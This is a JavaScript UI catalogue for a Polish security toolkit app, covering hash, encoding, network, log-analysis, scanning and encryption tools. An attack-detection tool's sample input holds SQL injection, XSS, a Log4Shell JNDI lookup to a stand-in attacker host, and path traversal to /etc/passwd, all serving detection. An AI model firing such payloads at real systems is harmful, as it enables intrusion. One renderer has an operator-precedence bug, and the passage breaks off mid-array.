/* ============================================================
   TZNSEC Toolkit — logika aplikacji (Rust backend przez IPC)
   ============================================================ */

const T = window.__TAURI__;
const invoke = T && T.core ? T.core.invoke : null;
const $ = (s, r = document) => r.querySelector(s);
const $$ = (s, r = document) => Array.from(r.querySelectorAll(s));

/* ---------- pomocnicze renderowanie (przed TOOLS - inaczej blad TDZ) ---------- */

function esc(s) {
  return String(s ?? "").replace(/[&<>"]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]));
}
function pre(v) { return `<pre>${esc(v)}</pre>`; }
function kv(pairs) {
  return `<dl class="kv">` + pairs.map(([k, v]) => `<dt>${esc(k)}</dt><dd>${esc(v)}</dd>`).join("") + `</dl>`;
}
function tag(t, cls) { return `<div class="tags" style="margin-top:10px"><span class="tag ${cls}">${esc(t)}</span></div>`; }

/* ---------- KATALOG NARZĘDZI ---------- */

const CATS = {
  crypto: {
    title: "Kryptografia",
    desc: "Skróty, kodowanie i analiza danych kryptograficznych.",
  },
  sec: {
    title: "Cyberbezpieczeństwo",
    desc: "Ocena haseł, nagłówków i wykrywanie ataków w danych.",
  },
  net: {
    title: "Sieć",
    desc: "Skanowanie, rozliczenia adresów i zapytania sieciowe.",
  },
  lab: {
    title: "Laboratorium",
    desc: "Narzędzia analityczne: diff, regex, HTTP i certyfikaty.",
  },
  ai: {
    title: "AI Hacking",
    desc: "Asystent do autoryzowanego pentestu. Klucz zostaje na twoim komputerze.",
  },
  set: {
    title: "Ustawienia",
    desc: "Konfiguracja asystenta AI, bezpieczeństwa i zachowania aplikacji.",
  },
  tools: {
    title: "Narzędzia",
    desc: "Zewnętrzne narzędzia pentesterskie — instalacja jednym kliknięciem.",
  },
};

const TOOLS = [
  /* ---------------- KRYPTOGRAFIA ---------------- */
  {
    id: "hash", cat: "crypto", ico: "#️⃣", name: "Generator hashy", tag: "popularne",
    desc: "MD5, SHA-1, SHA-256 i SHA-512 dla tekstu lub pliku.",
    fields: [
      { t: "text", id: "text", label: "Dane", value: "tznsec", ph: "tekst do zahashowania", wide: true },
      { t: "select", id: "algorithm", label: "Algorytm", value: "sha256",
        opts: ["md5", "sha1", "sha256", "sha512"], labels: ["MD5", "SHA-1", "SHA-256", "SHA-512"] },
    ],
    cmd: "hash_data", args: ["text", "algorithm"],
    out: (r) => kv([
      ["Algorytm", r.algorithm.toUpperCase()],
      ["Długość wejścia", r.input_length + " B"],
      ["Długość skrótu", r.hash.length + " znaków hex"],
    ]) + tag(r.hash, "ok"),
  },
  {
    id: "hashid", cat: "crypto", ico: "🔍", name: "Identyfikator hasha",
    desc: "Rozpoznaje format skrótu po długości i alfabecie.",
    fields: [{ t: "text", id: "hash", label: "Skrót", ph: "5d41402abc4b2a76b9719d911017c592", wide: true }],
    cmd: "hash_identify", args: ["hash"],
    out: (r) => kv([
      ["Długość", r.dlugosc],
      ["Zbiór znaków", r.znaki],
      ["Powtarzalne znaki", r.roznica_znakow ? "tak" : "nie"],
    ]) + (r.rozpoznania.length
      ? `<p class="hint">Możliwe algorytmy:</p><div class="tags">` +
        r.rozpoznania.map((x) => `<span class="tag ok">${esc(x.algorytm)}</span>`).join("") + `</div>`
      : "") + tag(r.wniosek, "mid"),
  },
  {
    id: "base64", cat: "crypto", ico: "🔡", name: "Base64",
    desc: "Kodowanie i dekodowanie danych w standardzie Base64.",
    fields: [
      { t: "text", id: "text", label: "Tekst", value: "CyberSec", wide: true },
      { t: "select", id: "mode", label: "Tryb", value: "encode", opts: ["encode", "decode"], labels: ["Koduj", "Dekoduj"] },
    ],
    cmd: "base64_tool", args: ["text", "mode"], out: pre,
  },
  {
    id: "hex", cat: "crypto", ico: "⬡", name: "Hex",
    desc: "Konwersja tekstu na zapis szesnastkowy i odwrotnie.",
    fields: [
      { t: "text", id: "text", label: "Tekst", value: "TZNSEC", wide: true },
      { t: "select", id: "mode", label: "Tryb", value: "encode", opts: ["encode", "decode"], labels: ["Tekst → Hex", "Hex → Tekst"] },
    ],
    cmd: "hex_tool", args: ["text", "mode"], out: pre,
  },
  {
    id: "url", cat: "crypto", ico: "🔗", name: "Kodowanie URL",
    desc: "Escape i unescape znaków w adresach oraz zapytaniach.",
    fields: [
      { t: "text", id: "text", label: "Tekst / URL", value: "https://a b/?q=zażółć gęślą jaźń", wide: true },
      { t: "select", id: "mode", label: "Tryb", value: "encode", opts: ["encode", "decode"], labels: ["Koduj", "Dekoduj"] },
    ],
    cmd: "url_encode_tool", args: ["text", "mode"], out: pre,
  },
  {
    id: "checksum", cat: "crypto", ico: "🧮", name: "Sumy kontrolne",
    desc: "CRC32, Adler32 i sumy bajtowe dla danych.",
    fields: [{ t: "text", id: "text", label: "Dane", value: "tznsec", wide: true }],
    cmd: "checksum_calc", args: ["text"],
    out: (r) => kv([
      ["CRC32", r.CRC32], ["Adler32", r.Adler32],
      ["Suma 8-bit", r.Suma_8bit], ["Suma 16-bit", r.Suma_16bit],
      ["Rozmiar", r.Rozmiar + " B"],
    ]),
  },
  {
    id: "entropy", cat: "crypto", ico: "📊", name: "Analiza entropii",
    desc: "Mierzy losowość danych — wykrywa szyfrowanie i kompresję.",
    fields: [{ t: "textarea", id: "text", label: "Dane", value: "tznsec", rows: 5, wide: true }],
    cmd: "entropy_analysis", args: ["text"],
    out: (r) => kv([
      ["Entropia", r.entropia + " bit/znak"], ["Bajty", r.bajty],
      ["Unikalne znaki", r.znaki_unikalne], ["Drukowalne", r.znaki_drukowalne],
    ]) + `<p class="hint">${esc(r.ocena)}</p>`,
  },
  {
    id: "jwt", cat: "crypto", ico: "🎫", name: "Analizator JWT",
    desc: "Dekoduje nagłówek i payload tokenu JWT.",
    fields: [{
      t: "textarea", id: "token", label: "Token JWT", rows: 4, wide: true,
      value: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3MDAwMDAwMDB9.x1y2z3",
    }],
    cmd: "jwt_tool", args: ["token"],
    out: (r) => kv([["Algorytm", r.algorithm], ["Typ", r.token_type], ["Podpis", r.signature_length + " znaków"]])
      + `<p class="hint">nagłówek</p><pre>${esc(JSON.stringify(r.header, null, 2))}</pre>`
      + `<p class="hint">payload</p><pre>${esc(JSON.stringify(r.payload, null, 2))}</pre>`,
  },
  {
    id: "json", cat: "crypto", ico: "🧾", name: "Formatowanie JSON",
    desc: "Formatuje, minifikuje i escapuje tekst JSON.",
    fields: [
      { t: "textarea", id: "text", label: "JSON", rows: 6, wide: true, value: '{"b":2,"a":{"c":[1,2,3]}}' },
      { t: "select", id: "mode", label: "Tryb", value: "format",
        opts: ["format", "minify", "escape", "unescape"], labels: ["Formatuj", "Minifikuj", "Escape", "Unescape"] },
    ],
    cmd: "json_tool", args: ["text", "mode"], out: (r) => pre(r.wynik),
  },

  /* ---------------- CYBERBEZPIECZEŃSTWO ---------------- */
  {
    id: "password", cat: "sec", ico: "🔑", name: "Siła hasła",
    desc: "Ocena entropii i jakości hasła. Hasło nie jest zapisywane.",
    fields: [{ t: "text", id: "password", label: "Hasło", value: "P@ssw0rd!2024", wide: true }],
    cmd: "password_strength", args: ["password"],
    out: (r) => {
      const yn = (v, l) => `<span class="tag ${v ? "ok" : "no"}">${v ? "✓" : "✗"}</span> <span class="hint" style="display:inline">${l}</span>`;
      return kv([
        ["Ocena", r.strength + " (" + r.score + "/" + r.max_score + ")"],
        ["Długość", r.length + " znaków"],
        ["Entropia", r.entropy + " bitów"],
      ]) + `<div class="tags" style="margin-top:10px">
        ${yn(r.has_lowercase, "małe litery")} ${yn(r.has_uppercase, "wielkie litery")}
        ${yn(r.has_digit, "cyfry")} ${yn(r.has_special, "znaki specjalne")}</div>`
        + (r.feedback.length ? `<p class="hint" style="color:var(--amber)">${r.feedback.map(esc).join("<br>")}</p>` : "");
    },
  },
  {
    id: "headers", cat: "sec", ico: "📋", name: "Nagłówki HTTP",
    desc: "Ocenia obecność nagłówków zabezpieczających w odpowiedzi.",
    fields: [{
      t: "textarea", id: "raw", label: "Nagłówki (Nazwa: wartość)", rows: 7, wide: true,
      value: "Strict-Transport-Security: max-age=63072000\nX-Frame-Options: DENY\nX-Content-Type-Options: nosniff",
    }],
    cmd: "headers_analyze", args: ["raw"],
    out: (r) => {
      const c = r.security_score >= 80 ? "ok" : r.security_score >= 50 ? "mid" : "no";
      return kv([["Ocena", r.security_score + "%"], ["Nagłówki", r.total_headers + " wczytanych"]])
        + `<p class="hint" style="color:var(--${c === "ok" ? "green" : c === "mid" ? "amber" : "red"})">${c === "ok" ? "Dobra konfiguracja" : c === "mid" ? "Częściowa ochrona" : "Słaba konfiguracja"}</p>`
        + `<p class="hint">obecne</p><div class="tags">${r.present_headers.map((h) => `<span class="tag ok">${esc(h)}</span>`).join("") || "—"}</div>`
        + `<p class="hint">brakujące</p><div class="tags">${r.missing_headers.map((h) => `<span class="tag no">${esc(h)}</span>`).join("") || "—"}</div>`;
    },
  },
  {
    id: "payloads", cat: "sec", ico: "🎯", name: "Wykrywanie ataków",
    desc: "Szuka wzorców SQLi, XSS, Log4Shell, traversal i innych w logach.",
    fields: [{
      t: "textarea", id: "text", label: "Logi / dane wejściowe", rows: 7, wide: true,
      value: "GET /?id=1' OR '1'='1 HTTP/1.1\nUser-Agent: <script>alert(1)</script>\nX-Log: ${jndi:ldap://evil.example/a}\nGET /../../etc/passwd HTTP/1.1",
    }],
    cmd: "scan_payloads", args: ["text"],
    out: (r) => kv([
      ["Wejście", r.typ_wejscia], ["Rozmiar", r.rozmiary],
      ["Typy wykryte", r.wykryte_typy], ["Krytyczne", r.trafienia_krytyczne],
    ]) + `<p class="hint">${esc(r.ocena)}</p>` + (r.wyniki.length ? r.wyniki.map((f) => `
        <div style="margin-top:12px">
          <div class="tags"><span class="tag ${f.poziom === "krytyczny" ? "no" : f.poziom === "wysoki" ? "mid" : "ok"}">${esc(f.nazwa)}</span>
          <span class="tag">${f.liczba} trafień</span></div>
          <p class="hint">${esc(f.opis)}</p>
          <p class="hint" style="color:var(--green)">naprawa: ${esc(f.naprawa)}</p>
          ${f.przyklady.slice(0, 4).map((p) => `<pre>linia ${p.linia}: ${esc(p.fragment)}</pre>`).join("")}
        </div>`).join("") : ""),
  },
  {
    id: "secrets", cat: "sec", ico: "🔐", name: "Wykrywanie sekretów",
    desc: "Skanuje dane pod klucze API, hasła i wycieki poświadczeń.",
    fields: [{
      t: "textarea", id: "text", label: "Kod / logi / config", rows: 7, wide: true,
      value: 'AWS_KEY = "AKIAIOSFODNN7EXAMPLE"\npassword = "SuperTajne123"\nurl = "postgres://user:haslo@db:5432/app"',
    }],
    cmd: "secret_scan", args: ["text"],
    out: (r) => kv([["Trafienia", r.znaleziono], ["Krytyczne", r.krytyczne]])
      + `<p class="hint">${esc(r.status)}</p>`
      + (r.trafienia.length ? `<table class="list">` + r.trafienia.slice(0, 30).map((t) => `
          <tr><td>${t.linia}</td><td>${esc(t.typ)}</td><td>${esc(t.fragment)}</td></tr>`).join("") + `</table>` : ""),
  },
  {
    id: "ua", cat: "sec", ico: "🕵️", name: "User-Agent",
    desc: "Rozpoznaje przeglądarkę, system i typ urządzenia.",
    fields: [{
      t: "textarea", id: "userAgent", label: "Ciąg User-Agent", rows: 3, wide: true,
      value: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
    }],
    cmd: "user_agent_info", args: ["userAgent"],
    out: (r) => kv([
      ["Przeglądarka", r.browser], ["System", r.os],
      ["Urządzenie", r.is_mobile ? "mobile" : "desktop"], ["Bot", r.is_bot ? "tak" : "nie"],
    ]),
  },
  {
    id: "breach", cat: "sec", ico: "🕳️", name: "Sprawdź wyciek hasła",
    desc: "Sprawdza, czy hasło figuruje w znanych bazach wycieków (k-anonimowo).",
    fields: [{
      t: "text", id: "password", label: "Hasło do sprawdzenia", value: "password", wide: true,
    }],
    cmd: "breach_check", args: ["password"],
    out: (r) => kv([
      ["Wykradzione", r.wyciekly ? "TAK" : "nie"],
      ["Liczba wycieków", r.liczba_wyciekow],
      ["Skrót (prefiks)", r.hash_prefix],
    ]) + tag(r.ocena, r.wyciekly ? "no" : "ok")
      + `<p class="hint">${esc(r.prywatnosc)}</p>`,
  },
  {
    id: "tls", cat: "sec", ico: "🔒", name: "Audyt TLS / HTTPS",
    desc: "Sprawdza dostępność HTTPS, HSTS i nagłówki bezpieczeństwa.",
    fields: [{ t: "text", id: "host", label: "Domena", value: "github.com", wide: true }],
    cmd: "tls_audit", args: ["host"],
    out: (r) => {
      if (r.error || r.https_dostepne === false) {
        return `<div class="err">HTTPS niedostępne: ${esc(r.error || "brak połączenia")}</div>`
          + (r.wskazowka ? `<p class="hint">${esc(r.wskazowka)}</p>` : "");
      }
      const s = r.naglowki_bezpieczenstwa;
      return kv([
        ["Host", r.host], ["IP", r.ip], ["Status HTTP", r.status],
        ["HSTS", r.hsts || "brak"],
      ]) + tag("Ocena nagłówków: " + s.security_score + "%",
          s.security_score >= 80 ? "ok" : s.security_score >= 50 ? "mid" : "no")
        + `<p class="hint">obecne: ${esc((s.present_headers || []).join(", ") || "—")}</p>`
        + `<p class="hint">brakujące: ${esc((s.missing_headers || []).join(", ") || "—")}</p>`;
    },
  },
  {
    id: "version", cat: "sec", ico: "🧬", name: "Skan wersji / fingerprint",
    desc: "Rozpoznaje stos technologiczny i pliki, które nie powinny być dostępne.",
    fields: [
      { t: "textarea", id: "headers", label: "Nagłówki HTTP", rows: 4, wide: true,
        value: "Server: nginx/1.18.0\nX-Powered-By: PHP/7.4.3\nX-Generator: Drupal 9" },
      { t: "textarea", id: "body", label: "Fragment HTML", rows: 5, wide: true,
        value: '<link href="/wp-content/themes/x/style.css">\n<a href="/.env">env</a>' },
    ],
    cmd: "version_scan", args: ["headers", "body"],
    out: (r) => {
      const tech = (r.wykryte_technologie || []).map((t) =>
        `<tr><td>${esc(t.technologia)}</td><td>${esc(t.wersja)}</td></tr>`).join("");
      const ex = (r.mozliwe_ujawnienia || []).map((e) =>
        `<tr><td>${esc(e.sciezka)}</td><td>${esc(e.ryzyko)}</td></tr>`).join("");
      return kv([["Status", r.status]])
        + (tech ? `<p class="hint">technologie</p><table class="list">${tech}</table>` : "")
        + (ex ? `<p class="hint" style="color:var(--red)">ujawnione zasoby</p><table class="list">${ex}</table>` : "")
        + `<p class="hint">${esc(r.porada)}</p>`;
    },
  },
  {
    id: "doslog", cat: "sec", ico: "📉", name: "Wykrywanie DoS w logach",
    desc: "Analizuje logi dostępu pod kątem skanów, brute-force i wyczerpania zasobów.",
    fields: [{
      t: "textarea", id: "log", label: "Logi (format combined)", rows: 8, wide: true,
      value: Array.from({ length: 6 }, (_, i) =>
        `203.0.113.${i + 1} - - [29/Sep/2026:10:00:00 +0000] "GET /admin?id=${i} HTTP/1.1" 404 120 "-" "sqlmap/1.7"`
      ).join("\n"),
    }],
    cmd: "dos_log_analyzer", args: ["log"],
    out: (r) => kv([
      ["Linie", r.linie_analizowane], ["Ruch", r.rozmiar_odpowiedzi],
    ]) + tag(r.ocena, r.znalezione_wzorce.some((x) => x.poziom === "krytyczny") ? "no" : "mid")
      + (r.statusy || []).length
        ? `<p class="hint">kody HTTP</p><div class="tags">` +
          r.statusy.map((s) => `<span class="tag">${s.kod}: ${s.liczba}</span>`).join("") + `</div>`
        : ""
      + (r.najwieksi_nadawcy || []).length
        ? `<p class="hint">najwięksi nadawcy</p><table class="list">` +
          r.najwieksi_nadawcy.map((x) => `<tr><td>${esc(x.klucz)}</td><td>${x.liczba}</td></tr>`).join("") + `</table>`
        : ""
      + (r.znalezione_wzorce || []).map((f) => `<div style="margin-top:12px">
          <div class="tags"><span class="tag ${f.poziom === "krytyczny" ? "no" : "mid"}">${esc(f.typ)}</span>
          <span class="tag">${esc(f.poziom)}</span></div>
          <p class="hint">${esc(f.opis)}</p>
          <p class="hint" style="color:var(--green)">akcja: ${esc(f.akcja)}</p></div>`).join(""),
  },

  /* ---------------- SIEĆ ---------------- */
  {
    id: "ports", cat: "net", ico: "📡", name: "Skaner portów",
    desc: "Sprawdza, które porty TCP są otwarte na wybranym hoście.",
    fields: [
      { t: "text", id: "target", label: "Host / IP", value: "127.0.0.1", ph: "192.168.1.1 lub domena" },
      { t: "text", id: "ports", label: "Porty", value: "1-1024", ph: "1-1024, 22,80,443" },
    ],
    cmd: "port_scan", args: ["target", "ports"],
    out: (r) => kv([
      ["Cel", r.target + " → " + r.ip],
      ["Otwarte", r.open_count], ["Zamknięte", r.closed_count],
      ["Sprawdzono", r.total_scanned + " (" + r.duration_ms + " ms)"],
    ]) + (r.open_ports.length
      ? `<table class="list" style="margin-top:10px">` + r.open_ports.map((p) => `<tr><td>${p.port}</td><td>${esc(p.service || "?")}</td></tr>`).join("") + `</table>`
      : `<p class="hint">Brak otwartych portów w podanym zakresie.</p>`),
  },
  {
    id: "cidr", cat: "net", ico: "🧮", name: "Kalkulator CIDR",
    desc: "Maska, adres sieci, rozśylanie i liczba hostów.",
    fields: [{ t: "text", id: "cidr", label: "Sieć CIDR", value: "192.168.1.0/24", ph: "10.0.0.0/8", wide: true }],
    cmd: "cidr_analyze", args: ["cidr"],
    out: (r) => kv(Object.entries(r).filter(([k]) => k !== "input")),
  },
  {
    id: "split", cat: "net", ico: "🌳", name: "Podział podsieci",
    desc: "Dzieli sieć na mniejsze podsieci (VLSM).",
    fields: [
      { t: "text", id: "cidr", label: "Sieć", value: "192.168.0.0/22" },
      { t: "text", id: "newPrefix", label: "Nowy prefiks", value: "24", ph: "24" },
    ],
    cmd: "cidr_split", args: ["cidr", "newPrefix"],
    out: (r) => kv([
      ["Źródło", r.zrodlo], ["Podział na", r.na],
      ["Liczba podsieci", r.pliczba_podsieci], ["Hostów na podsieć", r.hostow_na_podsiec],
    ]) + `<table class="list" style="margin-top:10px">` + r.podsieci.slice(0, 20).map((p) =>
      `<tr><td>${p.index}</td><td>${esc(p.zakres)}</td><td>${p.hostow}</td></tr>`).join("") + `</table>`,
  },
  {
    id: "hosts", cat: "net", ico: "📋", name: "Lista hostów",
    desc: "Generuje adresy IP z podsieci (do planowania).",
    fields: [{ t: "text", id: "cidr", label: "Sieć", value: "192.168.1.0/28", wide: true }],
    cmd: "host_expand", args: ["cidr"],
    out: (r) => kv([["Sieć", r.siec], ["Zakres hostów", r.zakres_hostsow], ["Pokazano", r.pokazano]])
      + `<p class="hint" style="word-break:break-all">${(r.adresy || []).join(", ")}</p>`,
  },
  {
    id: "ipinfo", cat: "net", ico: "🌍", name: "Informacje o IP",
    desc: "Lokalizacja, operator i ASN dla adresu IP.",
    fields: [{ t: "text", id: "ip", label: "Adres IP", value: "8.8.8.8", wide: true }],
    cmd: "ip_info", args: ["ip"],
    out: (r) => kv([
      ["IP", r.query], ["Kraj", r.country + " (" + r.countryCode + ")"],
      ["Miasto", r.city], ["Region", r.regionName],
      ["Strefa", r.timezone], ["ISP", r.isp], ["ASN", r.as], ["Organizacja", r.org],
    ]),
  },
  {
    id: "dns", cat: "net", ico: "🗺️", name: "DNS",
    desc: "Sprawdza rekordy DNS domeny.",
    fields: [
      { t: "text", id: "domain", label: "Domena", value: "example.com" },
      { t: "select", id: "recordType", label: "Rekord", value: "A",
        opts: ["A", "AAAA", "MX", "TXT", "NS", "CNAME", "SOA", "CAA"] },
    ],
    cmd: "dns_lookup", args: ["domain", "recordType"],
    out: (r) => `<table class="list">` + (r.records || []).map((v) => `<tr><td>${esc(r.type)}</td><td>${esc(v)}</td></tr>`).join("") + `</table>`,
  },
  {
    id: "sitefiles", cat: "net", ico: "📄", name: "security.txt / robots.txt",
    desc: "Pobiera i analizuje pliki bezpieczeństwa witryny.",
    fields: [{ t: "text", id: "url", label: "Domena", value: "example.com", wide: true }],
    cmd: "site_files", args: ["url"],
    out: (r) => kv([["Baza", r.baza], ["Znaleziono", r.znaleziono + "/2"]])
      + (r.pliki || []).map((p) => `<div style="margin-top:12px">
          <div class="tags"><span class="tag ${p.istnieje ? "ok" : "no"}">${esc(p.plik)}</span>
          <span class="tag">HTTP ${p.status}</span></div>
          ${p.tresc ? `<p class="hint">${esc(p.tresc).slice(0, 1200)}</p>`
            : `<p class="hint">${esc(p.blad || "brak pliku")}</p>`}
        </div>`).join(""),
  },

  /* ---------------- LABORATORIUM ---------------- */
  {
    id: "stress", cat: "lab", ico: "🔥", name: "Test obciążeniowy", tag: "localhost",
    desc: "Mierzy wydolność TWOJEJ usługi. Dozwolone tylko localhost i sieć prywatna.",
    fields: [
      { t: "text", id: "target", label: "Adres usługi", value: "127.0.0.1", wide: true },
      { t: "text", id: "port", label: "Port", value: "8080" },
      { t: "text", id: "path", label: "Ścieżka", value: "/" },
      { t: "text", id: "requests", label: "Zadań", value: "500" },
      { t: "text", id: "concurrency", label: "Równolegle", value: "20" },
      { t: "text", id: "duration", label: "Czas maks. (s)", value: "5" },
    ],
    cmd: "stress_test", args: ["target", "port", "requests", "concurrency", "duration", "path"],
    out: (r) => {
      if (r.error) {
        return `<div class="err">${esc(r.error)}</div>`
          + (r.wyjasnienie ? `<p class="hint">${esc(r.wyjasnienie)}</p>` : "");
      }
      const l = r.latencja_ms;
      return kv([
        ["Cel", r.cel + r.sciezka],
        ["Zadania", r.zadania_wyslane + " (" + r.sukces + " ok / " + r.bledy + " błędów)"],
        ["Czas", r.czas_sekundy + " s"],
        ["Przepustowość", r.zadania_na_sekunde + " req/s"],
        ["p50", l.p50 + " ms"], ["p95", l.p95 + " ms"],
        ["p99", l.p99 + " ms"], ["max", l.max + " ms"],
      ]) + `<p class="hint">${esc(r.uwaga)}</p>`;
    },
  },
  {
    id: "tailscale", cat: "lab", ico: "🪜", name: "Tailscale", tag: "nowe",
    desc: "Wykrywa Tailscale, Twoje adresy 100.x i węzły w sieci.",
    fields: [{ t: "text", id: "_none", label: "", value: "", wide: true, hidden: true }],
    cmd: "tailscale_detect", args: [],
    out: (r) => {
      if (!r.zainstalowany) {
        return `<div class="err">Tailscale nie jest zainstalowany</div>`
          + `<p class="hint">${esc(r.info)}</p>`;
      }
      const rows = (r.siec || []).map((n) =>
        `<tr><td>${esc(n.nazwa)}</td><td>${esc((n.adresy || []).join(", "))}</td>`
        + `<td>${n.online ? '<span class="tag ok">online</span>' : '<span class="tag">offline</span>'}</td></tr>`).join("");
      return kv([
        ["Zainstalowany", r.zainstalowany ? "tak" : "nie"],
        ["Aktywny", r.aktywny ? "TAK" : "nie"],
        ["Twoje adresy", (r.adresy || []).join(", ") || "—"],
        ["MagicDNS", r.domena_magicdns || "—"],
      ]) + (rows ? `<p class="hint">węzły w tailnecie</p><table class="list">${rows}</table>` : "")
        + `<p class="hint">${esc(r.info)}</p>`;
    },
  },
  {
    id: "tspeers", cat: "lab", ico: "📡", name: "Węzły tailnetu",
    desc: "Lista maszyn, na które możesz kierować test obciążeniowy.",
    fields: [{ t: "text", id: "_none", label: "", value: "", wide: true, hidden: true }],
    cmd: "tailscale_peers", args: [],
    out: (r) => {
      if (r.error) return `<div class="err">${esc(r.error)}</div>`;
      const rows = (r.wezly || []).map((n) =>
        `<tr><td>${esc(n.nazwa)}</td><td>${esc((n.adresy || []).join(", "))}</td>`
        + `<td>${n.online ? "online" : "offline"}</td><td>${esc(n.system)}</td></tr>`).join("");
      return kv([["Twoje adresy", (r.adresy_wlasne || []).join(", ")]])
        + (rows ? `<table class="list">${rows}</table>`
                : `<p class="hint">Brak węzłów — jesteś sam w tailnecie.</p>`);
    },
  },
  {
    id: "crypt", cat: "lab", ico: "🗄️", name: "Szyfrator plików",
    desc: "AES-256-GCM z hasłem (PBKDF2 210k iteracji). Plik źródłowy zostaje nietknięty.",
    fields: [
      { t: "text", id: "path", label: "Ścieżka do pliku", ph: "C:\\Users\\Ty\\dane.txt", wide: true },
      { t: "text", id: "password", label: "Hasło (min. 8 znaków)", type: "password", wide: true },
      { t: "select", id: "_mode", label: "Operacja", value: "encrypt",
        opts: ["encrypt", "decrypt"], labels: ["Szyfruj → .tzns", "Odszyfruj .tzns"] },
    ],
    cmd: "file_encrypt", args: ["path", "password"],
    pre: { decrypt: "file_decrypt" },
    out: (r) => {
      if (r.error) return `<div class="err">${esc(r.error)}</div>`;
      return kv([
        ["Plik źródłowy", r.plik_zrodlowy || r.sciezka || "—"],
        ["Wynik", r.plik_wyjściowy || "—"],
        ["Rozmiar", (r.rozmiar_pliku || r.rozmiar) + " B"],
        ["Algorytm", r.algorytm || "AES-256-GCM"],
        ["KDF", r.kdf || "—"],
      ]) + (r.podglad ? `<p class="hint">podgląd</p><pre>${esc(r.podglad)}</pre>` : "")
        + (r.uwaga ? `<p class="hint">${esc(r.uwaga)}</p>` : "");
    },
  },
  {
    id: "panic", cat: "lab", ico: "🧯", name: "Tryb panic",
    desc: "Czyści schowek i pliki robocze aplikacji, aby nie zostawić śladów.",
    fields: [
      { t: "check", id: "shutdown", label: "Zamknij program po czyszczeniu", value: false },
    ],
    cmd: "panic_mode", args: ["shutdown"],
    out: (r) => kv([
      ["Status", "wykonano"],
      ["Pliki użytkownika", r.pliki_uzytkownika],
    ]) + `<p class="hint">${esc(r.info)}</p>`
      + (r.wykonane || []).map((x) => `<p class="hint">• ${esc(x)}</p>`).join(""),
  },
  {
    id: "diff", cat: "lab", ico: "🔀", name: "Porównanie tekstów",
    desc: "Diff dwóch wersji tekstu z oznaczeniem zmian.",
    fields: [
      { t: "textarea", id: "a", label: "Wersja A", rows: 5, value: "admin\nhaslo123\nport=22", wide: true },
      { t: "textarea", id: "b", label: "Wersja B", rows: 5, value: "admin\nhaslo123\nport=2222\nnowa_linia", wide: true },
    ],
    cmd: "diff", args: ["a", "b"],
    out: (r) => kv([
      ["Dodane", r.dodane], ["Usunięte", r.usuniete],
      ["Niezmienione", r.niezmienione], ["Podobieństwo", r.podobnosc],
    ]) + `<div style="margin-top:12px">` + r.diff.map((d) =>
      `<div class="diff-line ${d.typ === "+" ? "add" : d.typ === "-" ? "del" : "eq"}">${d.typ} ${esc(d.tekst)}</div>`).join("")
      + `</div>`,
  },
  {
    id: "regex", cat: "lab", ico: "🎯", name: "Tester regex",
    desc: "Sprawdza wyrażenie regularne w tekście.",
    fields: [
      { t: "text", id: "pattern", label: "Wzorzec", value: "\\b[a-z0-9._%+-]+@[a-z0-9.-]+\\.[a-z]{2,}\\b", wide: true },
      { t: "textarea", id: "text", label: "Tekst", rows: 5, value: "kontakt: admin@tznsec.pl\ninna: dev@example.com", wide: true },
      { t: "check", id: "ignoreCase", label: "Ignoruj wielkość liter", value: true },
    ],
    cmd: "regex_test", args: ["pattern", "text", "ignoreCase"],
    out: (r) => kv([["Poprawny", r.poprawny], ["Dopasowania", r.liczba_dopasowan]])
      + (r.grupy_nazwane.length ? `<p class="hint">grupy nazwane: ${esc(r.grupy_nazwane.join(", "))}</p>` : "")
      + (r.dopasowania.length ? `<table class="list" style="margin-top:10px">` + r.dopasowania.map((m) =>
        `<tr><td>${m.pozycja}</td><td>linia ${m.linia}</td><td>${esc(m.znajdziek)}</td></tr>`).join("") + `</table>` : ""),
  },
  {
    id: "curl", cat: "lab", ico: "📡", name: "Generator curl",
    desc: "Buduje polecenie curl, PowerShell i Python z parametrów.",
    fields: [
      { t: "select", id: "method", label: "Metoda", value: "GET", opts: ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD"] },
      { t: "text", id: "url", label: "URL", value: "https://api.example.com/v1/users", wide: true },
      { t: "textarea", id: "headers", label: "Nagłówki", rows: 3, value: "Accept: application/json", wide: true },
      { t: "textarea", id: "body", label: "Body", rows: 3, value: "", wide: true },
      { t: "check", id: "insecure", label: "Pomiń weryfikację TLS (-k)", value: false },
    ],
    cmd: "curl_build", args: ["method", "url", "headers", "body", "insecure"],
    out: (r) => `<p class="hint">bash / curl</p><pre>${esc(r.curl)}</pre>
      <p class="hint">PowerShell</p><pre>${esc(r.powershell)}</pre>
      <p class="hint">Python</p><pre>${esc(r.python)}</pre>`,
  },
  {
    id: "cert", cat: "lab", ico: "📜", name: "Analiza certyfikatu PEM",
    desc: "Odczytuje strukturę certyfikatu lub klucza PEM.",
    fields: [{
      t: "textarea", id: "pem", label: "Dane PEM", rows: 8, wide: true,
      value: "-----BEGIN CERTIFICATE-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA\n-----END CERTIFICATE-----",
    }],
    cmd: "cert_parse", args: ["pem"],
    out: (r) => kv([
      ["Typ", r.typ], ["DER", r.rozmiar_der],
      ["Długość klucza", r.szacowana_dlugosc_klucza],
    ]) + `<p class="hint">ciągi widoczne w strukturze:</p><p class="hint" style="word-break:break-all">${esc((r.ciagi || []).join(" · "))}</p>`
      + `<p class="hint" style="color:var(--amber)">${esc(r.ostrzezenie)}</p>`,
  },
  {
    id: "text", cat: "lab", ico: "✂️", name: "Transformacje tekstu",
    desc: "ROT13, wielkość liter, odwracanie i statystyki.",
    fields: [
      { t: "textarea", id: "text", label: "Tekst", rows: 5, value: "Security By Design", wide: true },
      { t: "select", id: "mode", label: "Operacja", value: "upper",
        opts: ["upper", "lower", "title", "rot13", "reverse", "reverse_lines", "strip_ws", "count"],
        labels: ["WIELKIE", "małe", "Tytuł", "ROT13", "Odwróć znaki", "Odwróć linie", "Usuń nadmiar spacji", "Statystyki"] },
    ],
    cmd: "text_transform", args: ["text", "mode"],
    out: (r) => (r.wynik !== undefined ? pre(r.wynik) : kv(Object.entries(r))),
  },
];

/* ---------- BOOT ---------- */

const BOOT_LINES = [
  ["[ OK ] inicjalizacja rdzenia tznsec", ""],
  ["[ OK ] ladowanie modulu kryptograficznego", ""],
  ["[ OK ] rejestracja 26 narzedzi", ""],
